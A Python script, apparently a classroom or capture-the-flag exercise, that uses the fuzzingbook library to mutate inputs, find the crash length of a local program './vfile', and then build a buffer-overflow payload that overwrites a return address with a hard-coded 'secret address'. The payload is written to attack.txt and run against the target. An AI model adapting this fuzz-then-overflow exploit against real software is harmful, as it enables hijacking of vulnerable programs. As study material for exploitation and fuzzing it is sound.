# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
from io import BytesIO

from fuzzingbook.Fuzzer import RandomFuzzer
import os
import sys
from fuzzingbook.GrammarCoverageFuzzer import GrammarCoverageFuzzer
from fuzzingbook.Grammars import Grammar, EXPR_GRAMMAR, CGI_GRAMMAR, START_SYMBOL, URL_GRAMMAR
from fuzzingbook.MutationFuzzer import MutationFuzzer
from fuzzingbook.SearchBasedFuzzer import mutate


def print_hi(name):
    # Use a breakpoint in the code line below to debug your script.
    print(f'Hi, {name}')  # Press Ctrl+F8 to toggle the breakpoint.


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    f = RandomFuzzer()
    seed_input = "abcdefghijklmno"
    mutations = 150
    inp = seed_input
    lenInp = 15
    maxGoodLen = 0
    minBadLen = sys.maxsize
    original_stdout = sys.stdout  # Save a reference to the original standard output
    fuzzFile = 'attack.txt';
    fuzzedProgram = "./vfile ";
    for i in range(mutations):
        inp = mutate(inp)
        currLen = len(repr(inp))
        # create files and keep feeding them into the system
        with open(fuzzFile, 'w') as f:
            sys.stdout = f  # Change the standard output to the file we created.
            print(currLen)
            print(repr(inp))
            sys.stdout = original_stdout  # Reset the standard output to its original value
        if os.system(fuzzedProgram + fuzzFile) == 0:
            if maxGoodLen < currLen:
                maxGoodLen = currLen
                if i % 10 == 0:
                    print(i, "was good with len=", currLen)
        else:
            if minBadLen > currLen:
                minBadLen = currLen
            print(i, "crushed the system with len=", currLen)

    print(f"The maximum good len input that was found is {maxGoodLen}")
    print(f"The minimum bad len input that was found is {minBadLen}")
    attack = ""
    for i in range(minBadLen):
        attack = attack + "a"
    # secret address =  "0000000008001209"
    attack = attack + "\x09\x12\x00\x08\x00\x00\x00\x00"
    with open(fuzzFile, 'w') as f:
        sys.stdout = f  # Change the standard output to the file we created.
        print(len(attack))
        print(attack)
        sys.stdout = original_stdout  # Reset the standard output to its original value
    print("NOW WE ATTACK")
    print("This is our weapon ", fuzzFile)
    if os.system(fuzzedProgram + fuzzFile) == 0:
        print("HAHA GOCHU")

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
